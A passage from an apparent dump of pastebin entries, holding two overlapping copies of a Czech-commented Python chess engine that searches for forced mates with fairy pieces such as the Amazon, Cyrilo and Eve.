        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        for ri in range(8):
            line = """"
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line)
        return ""\n"".join(lines)

# Základní funkce pro šach
def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_square_attacked(board, r, c, by_side):
    """"""Zjistí, zda je pole (r,c) napadeno stranou by_side.""""""
    # Útoky pěšcem
    if by_side == 'b':
        if r+1 < 8 and c-1 >= 0 and board.grid[r+1][c-1] == 'p': return True
        if r+1 < 8 and c+1 < 8 and board.grid[r+1][c+1] == 'p': return True
    else:
        if r-1 >= 0 and c-1 >= 0 and board.grid[r-1][c-1] == 'P': return True
        if r-1 >= 0 and c+1 < 8 and board.grid[r-1][c+1] == 'P': return True
    
    # Útoky jezdcem a dalšími s jezdcovým pohybem (N, A, C, E)
    enemy_knights = ['n','a','c','e'] if by_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        nr, nc = r+dr, c+dc
        if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] in enemy_knights:
            return True
    
    # Útoky po řadách/sloupcích (R, Q, E, A)
    enemy_rook_like = ['r','q','e','a'] if by_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_rook_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Útoky diagonálně (B, Q, C, A)
    enemy_bishop_like = ['b','q','c','a'] if by_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_bishop_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Sousední král
    enemy_king = 'k' if by_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            nr, nc = r+dr, c+dc
            if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] == enemy_king:
                return True
    
    return False

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    return is_square_attacked(board, kr, kc, enemy_side)

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc] != '.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                
                # Klouzavé tahy – pro R, Q, E, A
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                
                # Diagonální tahy – pro B, Q, C, A
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    
    return moves

def get_legal_moves(board, side):
    """"""Vrátí seznam legálních tahů pro danou stranu.""""""
    moves = generate_pseudo_moves(board, side)
    legal_moves = []
    for move in moves:
        make_move(move, board)
        if not is_in_check(board, side):
            legal_moves.append(move)
        undo_move(board)
    return legal_moves

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží stav pro možnost undo.""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant, board.halfmove_clock, board.fullmove_number)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    
    # Aktualizace půltahových hodin a čísla tahu
    if piece.upper() == 'P' or captured != '.':
        board.halfmove_clock = 0
    else:
        board.halfmove_clock += 1
    
    if board.to_move == 'b':
        board.fullmove_number += 1
    
    board.grid[r1][c1] = '.'
    
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    
    # Aktualizace rošádových práv
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    
    # En passant
    if special == 'double':
        board.en_passant = (r1 + (-1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    if not move_stack:
        print(""Chyba: Žádný tah k vrácení!"")
        return
    
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    castling_rights, en_passant, halfmove_clock, fullmove_number = prev_state
    
    board.grid[r1][c1] = piece
    
    if special == 'castle':
        board.grid[r2][c2] = '.'
        if piece == 'K':
            if c2 == 6:
                board.grid[7][7] = 'R'; board.grid[7][5] = '.'
            else:
                board.grid[7][0] = 'R'; board.grid[7][3] = '.'
        else:
            if c2 == 6:
                board.grid[0][7] = 'r'; board.grid[0][5] = '.'
            else:
                board.grid[0][0] = 'r'; board.grid[0][3] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = '.'
        if piece == 'P':
            board.grid[r2+1][c2] = 'p'
        else:
            board.grid[r2-1][c2] = 'P'
    else:
        board.grid[r2][c2] = captured
    
    board.castling_rights = castling_rights
    board.en_passant = en_passant
    board.halfmove_clock = halfmove_clock
    board.fullmove_number = fullmove_number
    board.to_move = 'b' if board.to_move=='w' else 'w'

def move_to_notation(move, board):
    """"""Převede tah na standardní šachovou notaci.""""""
    cols = ""abcdefgh""
    r1, c1, r2, c2, promo, special = move
    
    if special == 'castle':
        return ""O-O"" if c2 > c1 else ""O-O-O""
    
    piece = board.grid[r1][c1].upper()
    is_pawn = piece == 'P'
    
    # Pro pěšce nezačínáme označením figury
    prefix = '' if is_pawn else piece
    
    # Pole
    from_square = cols[c1] + str(8 - r1)
    to_square = cols[c2] + str(8 - r2)
    
    # Proměna
    promotion = '=' + promo.upper() if promo else ''
    
    # En passant
    ep = "" e.p."" if special == 'enpassant' else ''
    
    return prefix + from_square + '-' + to_square + promotion + ep

def is_mate_in_n_plies(board, depth):
    """"""Zjistí, zda je v pozici mat v přesně 'depth' půltazích.""""""
    if depth == 0:
        # Je teď mat?
        side_to_move = board.to_move
        return is_in_check(board, side_to_move) and not get_legal_moves(board, side_to_move), None
    
    side_to_move = board.to_move
    legal_moves = get_legal_moves(board, side_to_move)
    
    # Pokud nemá tahy
    if not legal_moves:
        # Pokud je to mat nyní, není to mat v hloubce depth (musí být přesně)
        if is_in_check(board, side_to_move):
            return False, None
        # Pat - nemůže dát mat
        return False, None
    
    # Určení, zda je strana, která mate, na tahu
    mating_color = 'w'  # Předpokládejme, že bílý dává mat
    if depth % 2 == 0:
        # Pokud je sudý počet půltahů, pak je na tahu matovaná strana
        mating_color = 'b' if board.to_move == 'w' else 'w'
    else:
        # Pokud je lichý počet půltahů, pak je na tahu matující strana
        mating_color = board.to_move
    
    # Je matující strana na tahu?
    is_mating_side_to_move = (board.to_move == mating_color)
    
    if is_mating_side_to_move:
        # Matující strana hledá tah, který vede k matu
        for move in legal_moves:
            make_move(move, board)
            is_mate, _ = is_mate_in_n_plies(board, depth - 1)
            undo_move(board)
            
            if is_mate:
                return True, move
        
        # Nenašli jsme žádnou matující sekvenci
        return False, None
    else:
        # Bránící se strana hledá nejlepší obranu
        all_lead_to_mate = True
        best_defensive_move = None
        
        # Zkusíme najít tah, který oddálí mat
        for move in legal_moves:
            make_move(move, board)
            is_mate, _ = is_mate_in_n_plies(board, depth - 1)
            undo_move(board)
            
            if not is_mate:
                # Našli jsme únikový tah, který vyvrací mat v daném počtu půltahů
                all_lead_to_mate = False
                best_defensive_move = move
                break
        
        # Pokud všechny tahy vedou k matu, alespoň vybereme ten, který dává nejlepší šanci na obranu
        if all_lead_to_mate and legal_moves:
            # Tady bychom ideálně měli vybrat tah, který maximalizuje počet tahů do matu
            # Pro jednoduchost vybereme první tah, ale v reálném enginu bychom zde 
            # implementovali důkladnější analýzu
            best_defensive_move = legal_moves[0]
            
            # Pokusíme se najít tah, který oddálí mat (pokud všechny vedou k matu)
            max_depth_to_mate = -1
            for move in legal_moves:
                make_move(move, board)
                
                # Zkusíme najít mat ve všech možných hloubkách menších než aktuální
                for d in range(1, depth):
                    mate_found, _ = is_mate_in_n_plies(board, d)
                    if mate_found:
                        if d > max_depth_to_mate:
                            max_depth_to_mate = d
                            best_defensive_move = move
                        break
                
                undo_move(board)
            
        return all_lead_to_mate, best_defensive_move

def find_best_defensive_move(board, legal_moves):
    """"""Najde nejlepší obranný tah pro stranu na tahu.""""""
    if not legal_moves:
        return None
    
    # Pro krále se snažíme maximalizovat vzdálenost k soupeřovu králi
    side = board.to_move
    king_pos = find_king(board, side)
    enemy_king_pos = find_king(board, 'b' if side == 'w' else 'w')
    
    if king_pos and enemy_king_pos:
        kr, kc = king_pos
        ekr, ekc = enemy_king_pos
        
        # Pro krále hledáme tah, který maximalizuje vzdálenost mezi králi
        best_move = legal_moves[0]
        max_distance = -1
        
        for move in legal_moves:
            r1, c1, r2, c2, _, _ = move
            
            # Pokud pohybujeme králem
            if board.grid[r1][c1].upper() == 'K' and (r1, c1) == king_pos:
                # Spočítejme vzdálenost po tahu
                distance = max(abs(r2 - ekr), abs(c2 - ekc))
                
                if distance > max_distance:
                    max_distance = distance
                    best_move = move
        
        return best_move
    
    # Pokud nemáme krále nebo jiný případ, vrátíme první legální tah
    return legal_moves[0]

def find_mate_sequence(board, max_plies=20):
    """"""Najde a vypíše posloupnost tahů vedoucí k matu.""""""
    global running, start_time, move_stack
    
    # Vyčistit zásobník
    move_stack = []
    
    # Spustit časovač
    running = True
    start_time = time.time()
    timer_thread = threading.Thread(target=time_reporter)
    timer_thread.daemon = True
    timer_thread.start()
    
    try:
        # Nejprve kontrola, zda je již mat
        side_to_move = board.to_move
        legal_moves = get_legal_moves(board, side_to_move)
        
        if not legal_moves:
            if is_in_check(board, side_to_move):
                print(""\nPoziční analýza: Mat - "" + 
                      (""černý vyhrává"" if side_to_move == 'w' else ""bílý vyhrává""))
                return
            else:
                print(""\nPoziční analýza: Pat - remíza"")
                return
        
        # Zkusíme najít mat v několika tazích
        print(""\nHledám posloupnost tahů k matu..."")
        print(""\nProhledávám jednotlivé hloubky:"")
        
        for plies in range(1, max_plies + 1):
            print(f""\n--- Hloubka {plies} půltahů ---"")
            
            # Zkusíme najít mat v této hloubce
            is_mate, best_move = is_mate_in_n_plies(board, plies)
            
            if is_mate:
                print(f""\nNalezen mat v {plies} půltazích!"")
                
                # Rekonstruujeme a vypisujeme sekvenci tahů k matu
                print(""\nPosloupnost tahů k matu (s optimální obranou):"")
                variant_board = board.copy()
                
                # Vypíšeme počáteční pozici
                print(""\nVýchozí pozice:"")
                print(variant_board.display())
                print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                print(""-"" * 30)
                
                # Proveďme první tah
                move_notation = move_to_notation(best_move, variant_board)
                make_move(best_move, variant_board)
                print(f""1. {move_notation}"")
                print(variant_board.display())
                print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                print(""-"" * 30)
                
                # Pokud je již mat, končíme
                if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                    print(""Mat!"")
                    return
                
                # Nyní pokračujeme v rekonstrukci sekvence tahů
                curr_depth = plies - 1
                move_num = 2
                
                while curr_depth > 0:
                    # Najdeme nejlepší odpověď pro aktuální stranu na tahu
                    is_mat, next_move = is_mate_in_n_plies(variant_board, curr_depth)
                    
                    if next_move:
                        move_notation = move_to_notation(next_move, variant_board)
                        make_move(next_move, variant_board)
                        print(f""{move_num}. {move_notation}"")
                        print(variant_board.display())
                        print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                        print(""-"" * 30)
                        
                        # Kontrola, zda je již mat
                        if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                            print(""Mat!"")
                            return
                        
                        move_num += 1
                        curr_depth -= 1
                    else:
                        # Pokud nemáme další tah v sekvenci, najdeme nejlepší tah pro aktuální stranu
                        legal_moves = get_legal_moves(variant_board, variant_board.to_move)
                        if legal_moves:
                            # Vybereme nejlepší obranný tah
                            next_move = find_best_defensive_move(variant_board, legal_moves)
                            move_notation = move_to_notation(next_move, variant_board)
                            make_move(next_move, variant_board)
                            print(f""{move_num}. {move_notation}"")
                            print(variant_board.display())
                            print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                            print(""-"" * 30)
                            
                            move_num += 1
                            curr_depth -= 1
                        else:
                            break
                
                return
            else:
                # Pokud jsme nenašli mat v této hloubce, ukážeme posun hloubky simulací tahů
                # Vytvoříme kopii šachovnice pro simulaci
                sim_board = board.copy()
                # Pro sudé hloubky simulujeme tahy, abychom ukázali jinou pozici
                if plies > 1 and plies <= len(get_legal_moves(board, board.to_move)):
                    # Provedeme jeden tah pro ilustraci
                    sim_move = get_legal_moves(sim_board, sim_board.to_move)[0]
                    make_move(sim_move, sim_board)
                    print(""Ukázka pozice po jednom tahu:"")
                    print(sim_board.display())
                    print(f""Na tahu je {'bílý' if sim_board.to_move == 'w' else 'černý'}"")
                else:
                    # Pokud nemůžeme simulovat, aspoň zobrazíme aktuální pozici
                    print(""Aktuální pozice pro tuto hloubku:"")
                    print(board.display())
                    print(f""Na tahu je {'bílý' if board.to_move == 'w' else 'černý'}"")
        
        # Pokud nenajdeme mat, vypíšeme posloupnost tahů s nejlepšími tahy pro obě strany
        print(""\nMat nebyl nalezen v hloubce do"", max_plies, ""půltahů."")
        print(""\nPosloupnost nejlepších tahů (bez zaručeného matu):"")
        
        legal_moves = get_legal_moves(board, board.to_move)
        
        if legal_moves:
            variant_board = board.copy()
            
            # Vypíšeme počáteční pozici
            print(""\nVýchozí pozice:"")
            print(variant_board.display())
            print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
            print(""-"" * 30)
            
            # Jednoduché vyhledávání: pokusit se najít tahy vedoucí k matu nebo materiálnímu zisku
            for i in range(10):  # Max 10 tahů
                legal_moves = get_legal_moves(variant_board, variant_board.to_move)
                if not legal_moves:
                    if is_in_check(variant_board, variant_board.to_move):
                        print(""Mat!"")
                    else:
                        print(""Pat - remíza!"")
                    break
                
                # Zkusíme najít mat v 1
                best_move = None
                for move in legal_moves:
                    make_move(move, variant_board)
                    if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                        best_move = move
                        break
                    undo_move(variant_board)
                
                if best_move:
                    print(f""{i+1}. {move_to_notation(best_move, board)} (mat)"")
                    print(variant_board.display())
                    print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                    print(""-"" * 30)
                    print(""Mat!"")
                    break
                
                # Nemáme mat, zkusíme najít braní figury
                best_move = None
                for move in legal_moves:
                    r1, c1, r2, c2, _, _ = move
                    if variant_board.grid[r2][c2] != '.':
                        best_move = move
                        make_move(move, variant_board)
                        print(f""{i+1}. {move_to_notation(move, board)} (braní)"")
                        print(variant_board.display())
                        print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                        print(""-"" * 30)
                        break
                
                if best_move:
                    continue
                
                # Žádné braní, vybereme tah, který maximalizuje vzdálenost králů
                best_move = find_best_defensive_move(variant_board, legal_moves)
                make_move(best_move, variant_board)
                print(f""{i+1}. {move_to_notation(best_move, board)}"")
                print(variant_board.display())
                print(f""Na tahu je {'bílý' if variant_board.to_move == 'w' else 'černý'}"")
                print(""-"" * 30)
    
    finally:
        # Ukončit časovač
        running = False
        if timer_thread.is_alive():
            timer_thread.join(timeout=1.0)
        print("""")  # Nový řádek po časovém výpisu

def main():
    """"""Hlavní funkce programu.""""""
    # Několik zajímavých pozic pro testování
    standard_fen = ""rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1""  # Základní pozice
    
    # Pozice s Amazonkou (A/a) - kombinuje tahy dámy a jezdce
    amazon_fen = ""8/6A1/8/8/8/k7/8/K7 w - - 0 1""  # Bílá Amazonka
    
    # Pozice s Cyrilo (C/c) - kombinuje tahy jezdce a střelce
    cyrilo_fen = ""8/8/8/8/8/kq2K3/6C1/8 w - - 0 1""
    
    # Pozice s Eve (E/e) - kombinuje tahy jezdce a věže
    eve_fen = ""8/8/8/8/8/k2E4/8/K7 w - - 0 1""
    
    # Mat Amazonkou v jednom tahu
    amazon_mate_fen = ""k7/8/1K6/8/8/8/8/A7 w - - 0 1""
    
    # Bílý dá mat v 2
    mate_in_2_fen = ""3k4/8/3K4/8/8/8/8/R7 w - - 0 1""
    
    # Pozice pro testování (můžete změnit na jinou z výše uvedených)
    test_fen = amazon_mate_fen
    
    test_fen = ""6k1/8/5a2/3K4/8/8/8/3B4 w - - 0 1""
    
    test_fen = ""5k2/8/8/8/8/1KQ5/8/8 w - - 0 1""
    
    print(""Šachový engine pro hledání matových sekvencí"")
    print(""============================================"")
    
    # Načtení pozice
    board = Board(test_fen)
    print(""\nPočáteční pozice:"")
    print(board.display())
    print(f""Na tahu je {'bílý' if board.to_move == 'w' else 'černý'}"")
    
    # Najít sekvenci tahů k matu
    find_mate_sequence(board, max_plies=10)

if __name__ == ""__main__"":
    main() "
8X02h7WU,posledni kqK cas i vse ostatni OKK2L,max2201111,Python,Tuesday 1st of April 2025 11:26:11 AM CDT,"#!/usr/bin/env python3
import time
import threading
import sys
from math import inf

# Konstanty pro pohyby jezdce
knight_moves = [(2,1),(2,-1),(-2,1),(-2,-1),(1,2),(1,-2),(-1,2),(-1,-2)]

# Globální proměnné pro čas a historii tahů
running = False
start_time = 0
move_stack = []

def time_reporter():
    """"""Funkce pro výpis času každou sekundu na stejném řádku.""""""
    global running, start_time
    while running:
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        sys.stdout.write(f""\r[INFO] Uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        sys.stdout.flush()
        time.sleep(1)

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()
        self.en_passant = None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        for ri in range(8):
            line = """"
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line)
        return ""\n"".join(lines)

# Základní funkce pro šach
def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_square_attacked(board, r, c, by_side):
    """"""Zjistí, zda je pole (r,c) napadeno stranou by_side.""""""
    # Útoky pěšcem
    if by_side == 'b':
        if r+1 < 8 and c-1 >= 0 and board.grid[r+1][c-1] == 'p': return True
        if r+1 < 8 and c+1 < 8 and board.grid[r+1][c+1] == 'p': return True
    else:
        if r-1 >= 0 and c-1 >= 0 and board.grid[r-1][c-1] == 'P': return True
        if r-1 >= 0 and c+1 < 8 and board.grid[r-1][c+1] == 'P': return True
    
    # Útoky jezdcem a dalšími s jezdcovým pohybem (N, A, C, E)
    enemy_knights = ['n','a','c','e'] if by_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        nr, nc = r+dr, c+dc
        if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] in enemy_knights:
            return True
    
    # Útoky po řadách/sloupcích (R, Q, E, A)
    enemy_rook_like = ['r','q','e','a'] if by_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_rook_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Útoky diagonálně (B, Q, C, A)
    enemy_bishop_like = ['b','q','c','a'] if by_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_bishop_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Sousední král
    enemy_king = 'k' if by_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            nr, nc = r+dr, c+dc
            if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] == enemy_king:
                return True
    
    return False

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    return is_square_attacked(board, kr, kc, enemy_side)

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc] != '.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
